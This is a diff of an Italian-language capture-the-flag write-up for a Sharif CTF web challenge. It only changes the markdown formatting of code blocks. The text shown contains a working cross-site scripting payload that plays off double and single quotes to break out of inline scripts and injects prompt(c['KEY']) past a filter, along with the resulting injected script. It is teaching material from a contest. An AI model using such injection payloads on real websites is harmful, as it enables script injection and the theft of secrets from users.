@@ -57,14 +57,14 @@ Cerchiamo quindi un payload che fermi l'esecuzione del primo script e che ci per
 
 Il primo step e' trovare un modo per rompere il primo script ma non il secondo, e questo e' possibile grazie alla scelta degli organizzatori di usare apici doppi (") nel primo e apici singoli (') nel secondo.
 
-```
-view-source:http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>};prompt(c['KEY']);a={'p%27:'"&content=1
-```
+
+`view-source:http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>};prompt(c['KEY']);a={'p%27:'"&content=1`
+
 Questo payload contiene un apice doppio alla fine che rompe la sintassi del primo script, mentre chiude con un apice semplice il campo id nel secondo script, aggiunge prompt(c['KEY']) (equivalente di alert(c['KEY'] ma non filtrato), e crea un nuovo dict per completare la sintassi gia' esistente.
 
 Risulta quindi
-```
-    <script>
+
+```<script>
         alert("Sorry, server is busy for a while!");
         document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};prompt(c['KEY']);a={'p':'"";
     </script>
